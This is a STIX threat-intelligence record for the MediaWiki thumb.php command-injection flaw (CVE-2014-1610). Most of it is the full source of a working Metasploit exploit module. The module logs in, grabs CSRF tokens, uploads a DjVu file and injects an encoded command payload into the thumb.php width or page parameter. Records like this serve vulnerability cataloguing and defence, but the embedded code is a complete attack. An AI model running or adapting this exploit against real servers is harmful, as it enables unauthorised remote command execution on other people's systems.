{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a0ed7de8-daf7-47b8-aaa2-dc4786c2c390",
    "created": "2024-08-14T17:07:39.736144Z",
    "modified": "2024-08-14T17:07:39.736148Z",
    "name": "MediaWiki Thumb.php Remote Command Execution",
    "description": " MediaWiki 1.22.x before 1.22.2, 1.21.x before 1.21.5 and 1.19.x before 1.19.11 when DjVu or PDF file upload support is enabled, allows remote unauthenticated users to execute arbitrary commands via shell metacharacters. If no target file is specified this module will attempt to log in with the provided credentials to upload a file (.DjVu) to use for exploitation. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/mediawiki_thumb.rb",
            "external_id": "mediawiki_thumb.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-1610"
        },
        {
            "source_name": "reference",
            "url": "http://www.checkpoint.com/threatcloud-central/articles/2014-01-28-tc-researchers-discover.html"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.wikimedia.org/show_bug.cgi?id=60339"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'MediaWiki Thumb.php Remote Command Execution',\n      'Description' => %q{\n        MediaWiki 1.22.x before 1.22.2, 1.21.x before 1.21.5 and 1.19.x before 1.19.11,\n      when DjVu or PDF file upload support is enabled, allows remote unauthenticated\n      users to execute arbitrary commands via shell metacharacters. If no target file\n      is specified this module will attempt to log in with the provided credentials to\n      upload a file (.DjVu) to use for exploitation.\n      },\n      'Author' =>\n        [\n          'Netanel Rubin', # from Check Point - Discovery\n          'Brandon Perry', # Metasploit Module\n          'Ben Harris', # Metasploit Module\n          'Ben Campbell' # Metasploit Module\n        ],\n      'License' => MSF_LICENSE,\n      'References' =>\n        [\n          [ 'CVE', '2014-1610' ],\n          [ 'OSVDB', '102630'],\n          [ 'URL', 'http://www.checkpoint.com/threatcloud-central/articles/2014-01-28-tc-researchers-discover.html' ],\n          [ 'URL', 'https://bugzilla.wikimedia.org/show_bug.cgi?id=60339' ]\n        ],\n      'Privileged' => false,\n      'Targets' =>\n        [\n          [ 'Automatic PHP-CLI',\n            {\n              'Payload' =>\n                {\n                  'BadChars' => \"\\r\\n\",\n                  'PrependEncoder' => \"php -r \\\"\",\n                  'AppendEncoder' => \"\\\"\"\n                },\n              'Platform' => ['php'],\n              'Arch' => ARCH_PHP\n            }\n          ],\n          [ 'Linux CMD',\n            {\n              'Payload'        =>\n                {\n                  'BadChars' => \"\",\n                  'Compat'      =>\n                    {\n                      'PayloadType' => 'cmd',\n                      'RequiredCmd' => 'generic perl python php',\n                    }\n                },\n              'Platform' => ['unix'],\n              'Arch' => ARCH_CMD\n            }\n          ],\n          [ 'Windows CMD',\n            {\n              'Payload'        =>\n                {\n                  'BadChars' => \"\",\n                  'Compat'      =>\n                    {\n                      'PayloadType' => 'cmd',\n                      'RequiredCmd' => 'generic perl',\n                    }\n                },\n              'Platform' => ['win'],\n              'Arch' => ARCH_CMD\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-01-28'))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, \"Base MediaWiki path\", '/mediawiki' ]),\n        OptString.new('FILENAME', [ false, \"Target DjVu/PDF file (e.g target.djvu target.pdf)\", nil ]),\n        OptString.new('USERNAME', [ false, \"Username to authenticate with\", '' ]),\n        OptString.new('PASSWORD', [ false, \"Password to authenticate with\", '' ])\n      ])\n  end\n\n  def get_version(body)\n    meta_generator = get_html_value(body, 'meta', 'generator', 'content')\n\n    unless meta_generator\n      vprint_status(\"No META Generator tag on #{full_uri}.\")\n      return nil, nil, nil\n    end\n\n    if meta_generator && meta_generator =~ /mediawiki/i\n      vprint_status(\"#{meta_generator} detected.\")\n      meta_generator =~ /(\\d)\\.(\\d+)[\\.A-z]+(\\d+)/\n      major = $1.to_i\n      minor = $2.to_i\n      patch = $3.to_i\n      vprint_status(\"Major:#{major} Minor:#{minor} Patch:#{patch}\")\n\n      return major, minor, patch\n    end\n\n    return nil, nil, nil\n  end\n\n  def check\n    uri = target_uri.path\n\n    opts = { 'uri' => normalize_uri(uri, 'index.php') }\n\n    response = send_request_cgi!(opts)\n\n    if opts['redirect_uri']\n      vprint_status(\"Redirected to #{opts['redirect_uri']}.\")\n    end\n\n    unless response\n      vprint_status(\"No response from #{full_uri}.\")\n      return CheckCode::Unknown\n    end\n\n    # Mediawiki will give a 404 for unknown pages but still have a body\n    if response.code == 200 || response.code == 404\n      vprint_status(\"#{response.code} response received...\")\n\n      major, minor, patch = get_version(response.body)\n\n      unless major\n        return CheckCode::Unknown\n      end\n\n      if major == 1 && (minor < 8 || minor > 22)\n        return CheckCode::Safe\n      elsif major == 1 && (minor == 22 && patch > 1)\n        return CheckCode::Safe\n      elsif major == 1 && (minor == 21 && patch > 4)\n        return CheckCode::Safe\n      elsif major == 1 && (minor == 19 && patch > 10)\n        return CheckCode::Safe\n      elsif major == 1\n        return CheckCode::Appears\n      else\n        return CheckCode::Safe\n      end\n    end\n\n    vprint_status(\"Received response code #{response.code} from #{full_uri}\")\n    CheckCode::Unknown\n  end\n\n  def exploit\n    uri = target_uri.path\n\n    print_status(\"Grabbing version and login CSRF token...\")\n    response = send_request_cgi({\n      'uri' => normalize_uri(uri, 'index.php'),\n      'vars_get' => { 'title' => 'Special:UserLogin' }\n    })\n\n    unless response\n      fail_with(Failure::NotFound, \"Failed to retrieve webpage.\")\n    end\n\n    server = response['Server']\n    if server && target.name =~ /automatic/i && server =~ /win32/i\n      vprint_status(\"Windows platform detected: #{server}.\")\n      my_platform = Msf::Module::Platform::Windows\n    elsif server && target.name =~ /automatic/i\n      vprint_status(\"Nix platform detected: #{server}.\")\n      my_platform = Msf::Module::Platform::Unix\n    else\n      my_platform = target.platform.platforms.first\n    end\n\n    # If we have already identified a DjVu/PDF file on the server trigger\n    # the exploit\n    unless datastore['FILENAME'].blank?\n      payload_request(uri, datastore['FILENAME'], my_platform)\n      return\n    end\n\n    username = datastore['USERNAME']\n    password = datastore['PASSWORD']\n\n    major, minor, patch = get_version(response.body)\n\n    # Upload CSRF added in v1.18.2\n    # http://www.mediawiki.org/wiki/Release_notes/1.18#Changes_since_1.18.1\n    if ((major == 1) && (minor == 18) && (patch == 0 || patch == 1))\n      upload_csrf = false\n    elsif ((major == 1) && (minor < 18))\n      upload_csrf = false\n    else\n      upload_csrf = true\n    end\n\n    session_cookie = response.get_cookies\n\n    wp_login_token = get_html_value(response.body, 'input', 'wpLoginToken', 'value')\n\n    if wp_login_token.blank?\n      fail_with(Failure::UnexpectedReply, \"Couldn't find login token. Is URI set correctly?\")\n    else\n      print_good(\"Retrieved login CSRF token.\")\n    end\n\n    print_status(\"Attempting to login...\")\n    login = send_request_cgi({\n      'uri' => normalize_uri(uri, 'index.php'),\n      'method' => 'POST',\n      'vars_get' => {\n        'title' => 'Special:UserLogin',\n        'action' => 'submitlogin',\n        'type' => 'login'\n      },\n      'cookie' => session_cookie,\n      'vars_post' => {\n        'wpName' => username,\n        'wpPassword' => password,\n        'wpLoginAttempt' => 'Log in',\n        'wpLoginToken' => wp_login_token\n      }\n    })\n\n    if login and login.code == 302\n      print_good(\"Log in successful.\")\n    else\n      fail_with(Failure::NoAccess, \"Failed to log in.\")\n    end\n\n    auth_cookie = login.get_cookies.gsub('mediawikiToken=deleted;','')\n\n    # Testing v1.15.1 it looks like it has session fixation\n    # vulnerability so we dont get a new session cookie after\n    # authenticating. Therefore we need to include our old cookie.\n    unless auth_cookie.include? 'session='\n      auth_cookie << session_cookie\n    end\n\n    print_status(\"Getting upload CSRF token...\") if upload_csrf\n    upload_file = send_request_cgi({\n      'uri' => normalize_uri(uri, 'index.php', 'Special:Upload'),\n      'cookie' => auth_cookie\n    })\n\n    unless upload_file and upload_file.code == 200\n      fail_with(Failure::NotFound, \"Failed to access file upload page.\")\n    end\n\n    wp_edit_token = get_html_value(upload_file.body, 'input', 'wpEditToken', 'value') if upload_csrf\n    wp_upload = get_html_value(upload_file.body, 'input', 'wpUpload', 'value')\n    title = get_html_value(upload_file.body, 'input', 'title', 'value')\n\n    if upload_csrf && wp_edit_token.blank?\n      fail_with(Failure::UnexpectedReply, \"Couldn't find upload token. Is URI set correctly?\")\n    elsif upload_csrf\n      print_good(\"Retrieved upload CSRF token.\")\n    end\n\n    upload_mime = Rex::MIME::Message.new\n\n    djvu_file = ::File.binread(::File.join(Msf::Config.data_directory, \"exploits\", \"cve-2014-1610\", \"metasploit.djvu\"))\n    file_name = \"#{rand_text_alpha(4)}.djvu\"\n\n    upload_mime.add_part(djvu_file, \"application/octet-stream\", \"binary\", \"form-data; name=\\\"wpUploadFile\\\"; filename=\\\"#{file_name}\\\"\")\n    upload_mime.add_part(\"#{file_name}\", nil, nil, \"form-data; name=\\\"wpDestFile\\\"\")\n    upload_mime.add_part(\"#{rand_text_alpha(4)}\", nil, nil, \"form-data; name=\\\"wpUploadDescription\\\"\")\n    upload_mime.add_part(\"\", nil, nil, \"form-data; name=\\\"wpLicense\\\"\")\n    upload_mime.add_part(\"1\",nil,nil, \"form-data; name=\\\"wpIgnoreWarning\\\"\")\n    upload_mime.add_part(wp_edit_token, nil, nil, \"form-data; name=\\\"wpEditToken\\\"\") if upload_csrf\n    upload_mime.add_part(title, nil, nil, \"form-data; name=\\\"title\\\"\")\n    upload_mime.add_part(\"1\", nil, nil, \"form-data; name=\\\"wpDestFileWarningAck\\\"\")\n    upload_mime.add_part(wp_upload, nil, nil, \"form-data; name=\\\"wpUpload\\\"\")\n    post_data = upload_mime.to_s\n\n    print_status(\"Uploading DjVu file #{file_name}...\")\n\n    upload = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(uri, 'index.php', 'Special:Upload'),\n      'data'   => post_data,\n      'ctype'  => \"multipart/form-data; boundary=#{upload_mime.bound}\",\n      'cookie' => auth_cookie\n    })\n\n    if upload and upload.code == 302 and upload.headers['Location']\n      location = upload.headers['Location']\n      print_good(\"File uploaded to #{location}\")\n    else\n      if upload.body.include? 'not a permitted file type'\n        fail_with(Failure::NotVulnerable, \"Wiki is not configured for target files.\")\n      else\n        fail_with(Failure::UnexpectedReply, \"Failed to upload file.\")\n      end\n    end\n\n    payload_request(uri, file_name, my_platform)\n  end\n\n  def payload_request(uri, file_name, my_platform)\n    if my_platform == Msf::Module::Platform::Windows\n      trigger = \"1)&(#{payload.encoded})&\"\n    else\n      trigger = \"1;#{payload.encoded};\"\n    end\n\n    vars_get = { 'f' => file_name }\n    if file_name.include? '.pdf'\n      vars_get['width'] = trigger\n    elsif file_name.include? '.djvu'\n      vars_get['width'] = 1\n      vars_get['p'] = trigger\n    else\n      fail_with(Failure::BadConfig, \"Unsupported file extension: #{file_name}\")\n    end\n\n    print_status(\"Sending payload request...\")\n    r = send_request_cgi({\n      'uri' => normalize_uri(uri, 'thumb.php'),\n      'vars_get' => vars_get\n    }, 1)\n\n    if r && r.code == 404 && r.body =~ /not exist/\n      print_error(\"File: #{file_name} does not exist.\")\n    elsif r\n      print_error(\"Received response #{r.code}, exploit probably failed\")\n    end\n  end\n\n  # The order of name, value keeps shifting so regex is painful.\n  # Cant use nokogiri due to security issues\n  # Cant use REXML directly as its not strict XHTML\n  # So we do a filthy mixture of regex and REXML\n  def get_html_value(html, type, name, value)\n    return nil unless html\n    return nil unless type\n    return nil unless name\n    return nil unless value\n\n    found = nil\n    html.each_line do |line|\n      if line =~ /(<#{type}[^\\/]*name=\"#{name}\".*?\\/>)/i\n        found = $&\n        break\n      end\n    end\n\n    if found\n      doc = REXML::Document.new found\n      return doc.root.attributes[value]\n    end\n\n    ''\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-01-28",
    "x_mitre_platforms": [
        "['win']"
    ]
}